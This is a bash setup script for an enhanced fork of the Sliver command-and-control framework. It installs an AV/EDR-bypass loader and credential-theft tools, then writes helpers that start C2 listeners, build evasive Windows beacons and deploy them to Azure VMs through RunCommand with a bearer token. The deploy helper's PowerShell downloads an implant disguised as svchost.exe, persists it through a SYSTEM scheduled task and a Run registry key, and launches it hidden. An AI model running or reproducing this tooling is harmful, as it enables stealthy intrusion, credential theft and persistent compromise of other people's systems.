#!/bin/bash
# mgstate/sliver - Full Setup Script (Fresh Kali/Ubuntu)
# Installs Go, system deps, Harriet, builds Sliver, creates helper scripts.
#
# Usage:
#   cd ~/sliver && bash setup.sh
#
# Or one-liner:
#   git clone https://github.com/mgstate/sliver.git ~/sliver && cd ~/sliver && bash setup.sh

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[-]${NC} $1"; exit 1; }

SLIVER_DIR="${SLIVER_DIR:-$(pwd)}"
HARRIET_DIR="${HARRIET_DIR:-/opt/Home-Grown-Red-Team/Harriet}"
GO_VERSION="1.26.1"
GO_INSTALL_DIR="/usr/local"

# ─── Detect if we're in the sliver repo ───
if [ ! -f "$SLIVER_DIR/go.mod" ] || ! grep -q "bishopfox/sliver" "$SLIVER_DIR/go.mod" 2>/dev/null; then
    if [ -d "$HOME/sliver" ] && [ -f "$HOME/sliver/go.mod" ]; then
        SLIVER_DIR="$HOME/sliver"
    else
        info "Cloning mgstate/sliver..."
        git clone https://github.com/mgstate/sliver.git "$HOME/sliver"
        SLIVER_DIR="$HOME/sliver"
    fi
fi

cd "$SLIVER_DIR"

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  mgstate/sliver - Enhanced Fork Setup${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "  Sliver dir:  ${GREEN}$SLIVER_DIR${NC}"
echo -e "  Harriet dir: ${GREEN}$HARRIET_DIR${NC}"
echo -e "  Go version:  ${GREEN}$GO_VERSION${NC}"
echo ""

###############################################################################
# Step 1: System Dependencies
###############################################################################
info "Step 1/6: Installing system dependencies..."
if command -v apt-get &>/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq 2>/dev/null
    apt-get install -y -qq \
        build-essential \
        mingw-w64 \
        osslsigncode \
        python3-pycryptodome \
        python3-pip \
        git \
        curl \
        wget \
        jq \
        unzip \
        sed \
        2>/dev/null || true
    ok "APT packages installed"
    # Ensure pycryptodome is available (apt package name varies)
    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
elif command -v dnf &>/dev/null; then
    dnf install -y \
        gcc gcc-c++ make \
        mingw64-gcc mingw64-gcc-c++ \
        python3-pycryptodome \
        python3-pip \
        git curl wget jq unzip sed \
        2>/dev/null || true
    ok "DNF packages installed"
    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
elif command -v pacman &>/dev/null; then
    pacman -Sy --noconfirm \
        base-devel mingw-w64-gcc \
        python-pycryptodome \
        git curl wget jq unzip \
        2>/dev/null || true
    ok "Pacman packages installed"
    python3 -c "from Crypto.Cipher import AES" 2>/dev/null || pip3 install pycryptodome 2>/dev/null || true
else
    warn "Unknown package manager — install manually:"
    warn "  build-essential mingw-w64 osslsigncode python3-pycryptodome git curl jq"
fi

# Install Azure CLI (needed for ATTACKPATH.md RunCommand operations)
if ! command -v az &>/dev/null; then
    info "Installing Azure CLI..."
    if command -v apt-get &>/dev/null; then
        curl -sL https://aka.ms/InstallAzureCLIDeb | bash 2>/dev/null || warn "Az CLI install failed (install manually: curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash)"
    else
        warn "Install Azure CLI manually: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli"
    fi
else
    ok "Azure CLI already installed ($(az version --query '\"azure-cli\"' -o tsv 2>/dev/null))"
fi

###############################################################################
# Step 2: Go Installation
###############################################################################
info "Step 2/6: Setting up Go $GO_VERSION..."

INSTALL_GO=0

# Check if Go exists and is new enough
if command -v go &>/dev/null; then
    CURRENT_GO=$(go version 2>/dev/null | awk '{print $3}' | sed 's/go//')
    GO_MAJOR=$(echo "$CURRENT_GO" | cut -d. -f1)
    GO_MINOR=$(echo "$CURRENT_GO" | cut -d. -f2)
    if [ "$GO_MAJOR" -ge 1 ] 2>/dev/null && [ "$GO_MINOR" -ge 25 ] 2>/dev/null; then
        ok "Go $CURRENT_GO already installed (>= 1.25 required)"
    else
        warn "Go $CURRENT_GO too old (need >= 1.25), upgrading..."
        INSTALL_GO=1
    fi
elif [ -x "$GO_INSTALL_DIR/go/bin/go" ]; then
    # Go binary exists but not in PATH
    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"
    CURRENT_GO=$("$GO_INSTALL_DIR/go/bin/go" version 2>/dev/null | awk '{print $3}' | sed 's/go//')
    GO_MINOR=$(echo "$CURRENT_GO" | cut -d. -f2)
    if [ "$GO_MINOR" -ge 25 ] 2>/dev/null; then
        ok "Go $CURRENT_GO found at $GO_INSTALL_DIR/go/bin/go"
    else
        INSTALL_GO=1
    fi
else
    info "Go not found, installing..."
    INSTALL_GO=1
fi

if [ "$INSTALL_GO" = "1" ]; then
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64)  GO_ARCH="amd64" ;;
        aarch64) GO_ARCH="arm64" ;;
        armv7l)  GO_ARCH="armv6l" ;;
        *)       err "Unsupported architecture: $ARCH" ;;
    esac

    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    GO_URL="https://go.dev/dl/$GO_TAR"

    info "Downloading $GO_URL ..."
    wget -q --show-progress -O "/tmp/$GO_TAR" "$GO_URL" || curl -sL -o "/tmp/$GO_TAR" "$GO_URL"

    if [ ! -f "/tmp/$GO_TAR" ]; then
        err "Failed to download Go. Check network connectivity."
    fi

    info "Installing to $GO_INSTALL_DIR/go ..."
    rm -rf "$GO_INSTALL_DIR/go"
    tar -C "$GO_INSTALL_DIR" -xzf "/tmp/$GO_TAR"
    rm -f "/tmp/$GO_TAR"

    # Set PATH for this session
    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"

    # Persist PATH in all common shell configs
    GO_PATH_LINE="export PATH=$GO_INSTALL_DIR/go/bin:\$HOME/go/bin:\$PATH"
    for rcfile in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
        if [ -f "$rcfile" ] || [ "$rcfile" = "$HOME/.bashrc" ]; then
            if ! grep -qF "$GO_INSTALL_DIR/go/bin" "$rcfile" 2>/dev/null; then
                echo "" >> "$rcfile"
                echo "# Go (added by sliver setup)" >> "$rcfile"
                echo "$GO_PATH_LINE" >> "$rcfile"
            fi
        fi
    done

    # Also write to /etc/profile.d so ALL shells pick it up
    if [ -d /etc/profile.d ]; then
        echo "$GO_PATH_LINE" > /etc/profile.d/golang.sh
        chmod +x /etc/profile.d/golang.sh
    fi

    ok "Go $("$GO_INSTALL_DIR/go/bin/go" version | awk '{print $3}') installed"
fi

# Verify Go works
if ! command -v go &>/dev/null; then
    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"
fi
go version || err "Go installation failed — 'go version' not working"

###############################################################################
# Step 3: Harriet Loader (AV/EDR Bypass)
###############################################################################
info "Step 3/6: Setting up Harriet loader..."

HARRIET_REPO_DIR="$(dirname "$(dirname "$HARRIET_DIR")")/Home-Grown-Red-Team"

if [ -d "$HARRIET_DIR" ] && [ -f "$HARRIET_DIR/Makefile" -o -f "$HARRIET_DIR/setup.sh" -o -d "$HARRIET_DIR/FULLAes" ]; then
    ok "Harriet already present at $HARRIET_DIR"
else
    info "Cloning Harriet from GitHub..."
    mkdir -p "$(dirname "$HARRIET_REPO_DIR")"
    if [ -d "$HARRIET_REPO_DIR" ]; then
        info "Repo exists, pulling latest..."
        cd "$HARRIET_REPO_DIR" && git pull 2>/dev/null || true
        cd "$SLIVER_DIR"
    else
        git clone https://github.com/assume-breach/Home-Grown-Red-Team.git "$HARRIET_REPO_DIR"
    fi

    if [ -f "$HARRIET_DIR/setup.sh" ]; then
        info "Running Harriet setup.sh..."
        cd "$HARRIET_DIR"
        bash setup.sh || warn "Harriet setup.sh had errors (may still work)"
        cd "$SLIVER_DIR"
        ok "Harriet installed"
    elif [ -d "$HARRIET_DIR/FULLAes" ]; then
        ok "Harriet present (no setup.sh needed)"
    else
        warn "Harriet directory structure unexpected — check $HARRIET_DIR"
        warn "Continuing anyway (harriet command may not work)"
    fi
fi

###############################################################################
# Step 4: Download Post-Exploitation Tools
###############################################################################
info "Step 4/6: Downloading post-exploitation tools..."
TOOLS_DIR="$SLIVER_DIR/tools"
mkdir -p "$TOOLS_DIR"

# LSA Whisperer BOF (Credential Guard bypass — loads directly into Sliver)
if [ ! -d "$TOOLS_DIR/lsawhisper-bof" ]; then
    info "Cloning LSA Whisperer BOF..."
    git clone https://github.com/dazzyddos/lsawhisper-bof.git "$TOOLS_DIR/lsawhisper-bof" 2>/dev/null || warn "LSA Whisperer BOF clone failed"
fi

# No-Consolation (run unmanaged EXEs in-process via BOF)
if [ ! -d "$TOOLS_DIR/No-Consolation" ]; then
    info "Cloning No-Consolation..."
    git clone https://github.com/fortra/No-Consolation.git "$TOOLS_DIR/No-Consolation" 2>/dev/null || warn "No-Consolation clone failed"
fi

# pypykatz (parse LSASS dumps offline)
pip3 install pypykatz 2>/dev/null || true

# impacket (secretsdump, psexec, wmiexec)
pip3 install impacket 2>/dev/null || true

# netexec / crackmapexec
pip3 install netexec 2>/dev/null || true

ok "Tools downloaded to $TOOLS_DIR"

###############################################################################
# Step 5: Build Sliver
###############################################################################
info "Step 5/6: Building Sliver server + client..."
cd "$SLIVER_DIR"

# Ensure Go modules are available
if [ -d "vendor" ]; then
    info "Using vendored dependencies"
else
    info "Downloading Go modules (first build, this takes a few minutes)..."
    go mod download
fi

info "Running make (this takes several minutes on first build)..."
make

# Verify
if [ -f "$SLIVER_DIR/sliver-server" ] && [ -f "$SLIVER_DIR/sliver-client" ]; then
    ok "sliver-server built: $(ls -lh "$SLIVER_DIR/sliver-server" | awk '{print $5}')"
    ok "sliver-client built: $(ls -lh "$SLIVER_DIR/sliver-client" | awk '{print $5}')"
else
    err "Build failed — sliver-server or sliver-client not found in $SLIVER_DIR"
fi

###############################################################################
# Step 5: Create Helper Scripts
###############################################################################
info "Step 6/6: Creating helper scripts..."

# ─── start.sh ───
cat > "$SLIVER_DIR/start.sh" << 'STARTEOF'
#!/bin/bash
# Start Sliver server with auto-listener setup.
# Kills orphans, starts daemon, imports profile (first run), starts mTLS, drops into client.
#
# Usage:
#   ./start.sh                              # mTLS on 8888
#   ./start.sh --domain cdn.yourdomain.com  # mTLS on 8888 + HTTPS on 443
#   ./start.sh --mtls-port 9999             # custom mTLS port
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"

MTLS_PORT=8888
HTTPS_PORT=443
DOMAIN=""
while [[ $# -gt 0 ]]; do
    case $1 in
        --domain|-d)     DOMAIN="$2"; shift 2 ;;
        --mtls-port)     MTLS_PORT="$2"; shift 2 ;;
        --https-port)    HTTPS_PORT="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 [--domain DOMAIN] [--mtls-port PORT] [--https-port PORT]"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

# ─── Kill orphan sliver-server processes ───
if pgrep -f "sliver-server" >/dev/null 2>&1; then
    echo "[*] Killing existing sliver-server..."
    pkill -f "sliver-server" 2>/dev/null || true
    sleep 2
fi

# ─── Free listener ports ───
for PORT in $MTLS_PORT $HTTPS_PORT; do
    PIDS=$(lsof -ti :"$PORT" 2>/dev/null || true)
    if [ -n "$PIDS" ]; then
        echo "[*] Killing process on port $PORT (PID $PIDS)..."
        echo "$PIDS" | xargs kill -9 2>/dev/null || true
        sleep 1
    fi
done

# ─── Start server daemon ───
echo "[*] Starting sliver-server daemon..."
"$SCRIPT_DIR/sliver-server" daemon &
SERVER_PID=$!
disown $SERVER_PID

# ─── Create operator config if needed ───
CFG_DIR="$HOME/.sliver-client/configs"
mkdir -p "$CFG_DIR"
if [ -z "$(ls -A "$CFG_DIR" 2>/dev/null)" ]; then
    echo "[*] Creating operator config..."
    sleep 3
    "$SCRIPT_DIR/sliver-server" operator --name local --lhost localhost --save "$CFG_DIR/local.cfg" 2>/dev/null
fi

# ─── Wait for server to be ready ───
echo "[*] Waiting for server..."
READY=0
for i in $(seq 1 20); do
    if "$SCRIPT_DIR/sliver-client" version &>/dev/null; then
        READY=1; break
    fi
    sleep 2
done
if [ "$READY" = "0" ]; then
    echo "[-] Server did not start in time. Check: $SCRIPT_DIR/sliver-server daemon"
    exit 1
fi
echo "[+] Server ready (PID $SERVER_PID)"

# ─── Import C2 profile (first run only) ───
MARKER="$HOME/.sliver/.profile_imported"
PROFILE="$SCRIPT_DIR/opsec-profiles/microsoft365-c2.json"
if [ ! -f "$MARKER" ] && [ -f "$PROFILE" ]; then
    echo "[*] Importing microsoft365 C2 profile..."
    "$SCRIPT_DIR/sliver-client" << IMPORT
c2profiles import -n microsoft365 -f $PROFILE
IMPORT
    mkdir -p "$HOME/.sliver" 2>/dev/null
    touch "$MARKER"
    echo "[+] Profile imported (persists across restarts)"
fi

# ─── Install armory extensions (first run only) ───
ARMORY_MARKER="$HOME/.sliver/.armory_installed"
if [ ! -f "$ARMORY_MARKER" ]; then
    echo "[*] Installing armory extensions (first run — takes a few minutes)..."
    "$SCRIPT_DIR/sliver-client" << ARMORY
armory install windows-credentials
armory install kerberos
armory install situational-awareness
armory install windows-pivot
armory install windows-bypass
armory install .net-pivot
armory install .net-recon
armory install .net-execute
ARMORY
    touch "$ARMORY_MARKER"
    echo "[+] Armory extensions installed (persists per-client)"
fi

# ─── Start listeners ───
echo "[*] Starting mTLS listener on 0.0.0.0:$MTLS_PORT..."
LISTENER_CMDS="mtls --lhost 0.0.0.0 --lport $MTLS_PORT"

if [ -n "$DOMAIN" ]; then
    echo "[*] Starting HTTPS listener on 0.0.0.0:$HTTPS_PORT ($DOMAIN)..."
    LISTENER_CMDS="$LISTENER_CMDS
https --lhost 0.0.0.0 --lport $HTTPS_PORT -d $DOMAIN"
fi

"$SCRIPT_DIR/sliver-client" << LISTENERS
$LISTENER_CMDS
LISTENERS

echo ""
echo "════════════════════════════════════════════════"
echo "  Sliver ready"
echo "  mTLS listener: 0.0.0.0:$MTLS_PORT"
[ -n "$DOMAIN" ] && echo "  HTTPS listener: 0.0.0.0:$HTTPS_PORT ($DOMAIN)"
echo "  Server PID: $SERVER_PID"
echo "════════════════════════════════════════════════"
echo ""
echo "[*] Dropping into interactive console..."
exec "$SCRIPT_DIR/sliver-client"
STARTEOF
chmod +x "$SLIVER_DIR/start.sh"

# ─── gen-implant.sh ───
cat > "$SLIVER_DIR/gen-implant.sh" << 'GENEOF'
#!/bin/bash
# Generate a Harriet-wrapped Sliver beacon.
#
# Usage:
#   ./gen-implant.sh --ip YOUR_C2_IP [--domain CDN_DOMAIN] [--method directsyscall]
set -e
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"

MTLS_PORT=8888; HTTPS_PORT=443; DOMAIN=""; PROFILE="microsoft365"
METHOD="directsyscall"; BEACON_SEC=60; JITTER=30; OUTPUT="/tmp/implant.exe"
SHELLCODE_ONLY=0; HARRIET_PATH="/opt/Home-Grown-Red-Team/Harriet"; C2_IP=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)             C2_IP="$2"; shift 2 ;;
        --mtls-port)      MTLS_PORT="$2"; shift 2 ;;
        --https-port)     HTTPS_PORT="$2"; shift 2 ;;
        --domain)         DOMAIN="$2"; shift 2 ;;
        --profile)        PROFILE="$2"; shift 2 ;;
        --method)         METHOD="$2"; shift 2 ;;
        --beacon-sec)     BEACON_SEC="$2"; shift 2 ;;
        --jitter)         JITTER="$2"; shift 2 ;;
        --output|-o)      OUTPUT="$2"; shift 2 ;;
        --shellcode-only) SHELLCODE_ONLY=1; shift ;;
        --harriet-path)   HARRIET_PATH="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 --ip C2_IP [options]"
            echo "  --ip IP              C2 callback IP (required)"
            echo "  --domain DOMAIN      HTTPS C2 domain"
            echo "  --profile NAME       C2 profile (default: microsoft365)"
            echo "  --method METHOD      Harriet method: directsyscall|queueapc|nativeapi|inject|aes"
            echo "  --output FILE        Output path (default: /tmp/implant.exe)"
            echo "  --shellcode-only     Output raw .bin, skip Harriet"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

[ -z "$C2_IP" ] && { echo "Usage: $0 --ip YOUR_C2_IP [--domain DOMAIN]"; exit 1; }

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SC="/tmp/sliver_sc_$$.bin"

C2="--mtls ${C2_IP}:${MTLS_PORT}"
[ -n "$DOMAIN" ] && C2="$C2 --http https://${DOMAIN}:${HTTPS_PORT}"

echo "[*] Generating beacon: $C2 | profile=$PROFILE | ${BEACON_SEC}s+${JITTER}s jitter"
"$SCRIPT_DIR/sliver-client" << CMD
generate beacon $C2 --os windows --arch amd64 --format shellcode --evasion \
  --c2profile $PROFILE --seconds $BEACON_SEC --jitter $JITTER \
  --strategy r --reconnect 30 --max-errors 10 --save $SC
CMD

[ ! -f "$SC" ] && { echo "[-] Shellcode generation failed"; exit 1; }
echo "[+] Shellcode: $SC ($(stat -c%s "$SC" 2>/dev/null || wc -c < "$SC") bytes)"

if [ "$SHELLCODE_ONLY" = "1" ]; then
    mv "$SC" "$OUTPUT"; echo "[+] Saved: $OUTPUT"; exit 0
fi

echo "[*] Wrapping with Harriet ($METHOD)..."
"$SCRIPT_DIR/sliver-client" << CMD2
harriet --shellcode $SC --method $METHOD --format exe \
  --output $OUTPUT --harriet-path $HARRIET_PATH
CMD2

[ -f "$OUTPUT" ] && echo "[+] Ready: $OUTPUT ($(stat -c%s "$OUTPUT" 2>/dev/null || wc -c < "$OUTPUT") bytes)" || echo "[-] Harriet wrapping failed"
rm -f "$SC"
GENEOF
chmod +x "$SLIVER_DIR/gen-implant.sh"

# ─── deploy-runcommand.sh ───
cat > "$SLIVER_DIR/deploy-runcommand.sh" << 'DEPLOYEOF'
#!/bin/bash
# Deploy Sliver implant to Azure VM via RunCommand v2.
#
# Usage:
#   ./deploy-runcommand.sh --token ARM_TOKEN --sub SUB --rg RG --vm VM --implant-url URL
set -e

TOKEN=""; SUB=""; RG=""; VM=""; IMPLANT_URL=""
while [[ $# -gt 0 ]]; do
    case $1 in
        --token)       TOKEN="$2"; shift 2 ;;
        --sub)         SUB="$2"; shift 2 ;;
        --rg)          RG="$2"; shift 2 ;;
        --vm)          VM="$2"; shift 2 ;;
        --implant-url) IMPLANT_URL="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 --token TOKEN --sub SUB_ID --rg RG --vm VM --implant-url URL"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

[ -z "$TOKEN" ] || [ -z "$SUB" ] || [ -z "$RG" ] || [ -z "$VM" ] || [ -z "$IMPLANT_URL" ] && {
    echo "Usage: $0 --token TOKEN --sub SUB_ID --rg RG --vm VM --implant-url URL"; exit 1
}

API="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM"
H=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")

echo "[*] Getting VM location..."
LOC=$(curl -s "${H[@]}" "$API?api-version=2023-07-01" | jq -r .location)
[ "$LOC" = "null" ] || [ -z "$LOC" ] && { echo "[-] Failed — check token/sub/rg/vm"; exit 1; }
echo "[+] Location: $LOC"

echo "[*] Checking VM state..."
STATE=$(curl -s "${H[@]}" "$API/instanceView?api-version=2023-07-01" | jq -r '.statuses[] | select(.code | startswith("PowerState/")) | .code')
echo "[*] State: $STATE"
[ "$STATE" != "PowerState/running" ] && { echo "[-] VM not running"; exit 1; }

SCRIPT=$(cat <<'PS'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$u = "IMPLANT_URL_PLACEHOLDER"
$p = Join-Path $env:ProgramData "Microsoft\Network\svchost.exe"
$d = Split-Path $p
if(!(Test-Path $d)){New-Item -Type Directory $d -Force|Out-Null}
try { Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing -TimeoutSec 120; "[+] Downloaded" } catch { "[-] Download failed: $_"; exit 1 }
try { $a=New-ScheduledTaskAction -Execute $p; $t=New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName "Microsoft\Windows\NetTrace\DiagCheck" -Action $a -Trigger $t -User "SYSTEM" -RunLevel Highest -Force|Out-Null; "[+] Task created" } catch { "[!] Task failed: $_" }
try { Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "DiagTrack" -Value $p -Force; "[+] Run key set" } catch { "[!] Key failed: $_" }
Start-Process -FilePath $p -WindowStyle Hidden; "[+] Launched"
PS
)
SCRIPT="${SCRIPT//IMPLANT_URL_PLACEHOLDER/$IMPLANT_URL}"

CMD_NAME="deploy-$(date +%s)"
echo "[*] Deploying: $CMD_NAME"

BODY=$(jq -n --arg l "$LOC" --arg s "$SCRIPT" '{location:$l,properties:{source:{script:$s},asyncExecution:true,timeoutInSeconds:86400}}')
URL="$API/runCommands/$CMD_NAME?api-version=2023-07-01"
CODE=$(curl -s -o /tmp/rc_resp.json -w "%{http_code}" -X PUT "${H[@]}" "$URL" -d "$BODY")

[ "$CODE" = "200" ] || [ "$CODE" = "201" ] && echo "[+] Deployed (HTTP $CODE)" || { echo "[-] Failed (HTTP $CODE)"; cat /tmp/rc_resp.json; exit 1; }

echo "[*] Polling..."
for i in $(seq 1 30); do
    sleep 10
    R=$(curl -s "${H[@]}" "$URL&\$expand=instanceView")
    S=$(echo "$R" | jq -r '.properties.instanceView.executionState // "Unknown"')
    echo "    [$i] $S"
    [ "$S" = "Succeeded" ] && { echo "$R" | jq -r '.properties.instanceView.output // ""'; echo "[+] Done — check sliver > beacons"; exit 0; }
    [ "$S" = "Failed" ] && { echo "$R" | jq -r '.properties.instanceView.error // ""'; exit 1; }
done
echo "[!] Timeout — check Azure portal"
DEPLOYEOF
chmod +x "$SLIVER_DIR/deploy-runcommand.sh"

ok "Helper scripts created: start.sh, gen-implant.sh, deploy-runcommand.sh"

###############################################################################
# Done
###############################################################################
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  Setup Complete!${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${CYAN}Binaries:${NC}"
echo -e "    ${GREEN}$SLIVER_DIR/sliver-server${NC}"
echo -e "    ${GREEN}$SLIVER_DIR/sliver-client${NC}"
echo ""
echo -e "  ${CYAN}Usage:${NC}"
echo ""
echo -e "  ${YELLOW}1. Start server:${NC}"
echo -e "     ./start.sh"
echo ""
echo -e "  ${YELLOW}2. Import C2 profile (in sliver console):${NC}"
echo -e "     c2profiles import -n microsoft365 -f opsec-profiles/microsoft365-c2.json"
echo ""
echo -e "  ${YELLOW}3. Start listeners:${NC}"
echo -e "     mtls --lhost 0.0.0.0 --lport 8888"
echo -e "     https --lhost 0.0.0.0 --lport 443 -d your-domain.com"
echo ""
echo -e "  ${YELLOW}4. Generate implant:${NC}"
echo -e "     generate beacon --mtls YOUR_IP:8888 --os windows --arch amd64 \\"
echo -e "       --format shellcode --evasion --c2profile microsoft365 \\"
echo -e "       --seconds 60 --jitter 30 --strategy r --save /tmp/beacon.bin"
echo ""
echo -e "  ${YELLOW}5. Wrap with Harriet (uses native EXE.sh/DLL.sh):${NC}"
echo -e "     harriet --shellcode /tmp/beacon.bin --method directsyscall \\"
echo -e "       --format exe --output /tmp/implant.exe \\"
echo -e "       --harriet-path $HARRIET_DIR"
echo ""
echo -e "  ${YELLOW}Or use helper scripts:${NC}"
echo -e "     ./gen-implant.sh --ip YOUR_IP --domain your-domain.com"
echo -e "     ./deploy-runcommand.sh --token TOKEN --sub SUB --rg RG --vm VM --implant-url URL"
echo ""
echo -e "  ${CYAN}Docs:${NC} OPSEC-GUIDE.md | AZURE-KILLCHAIN.md"
echo ""
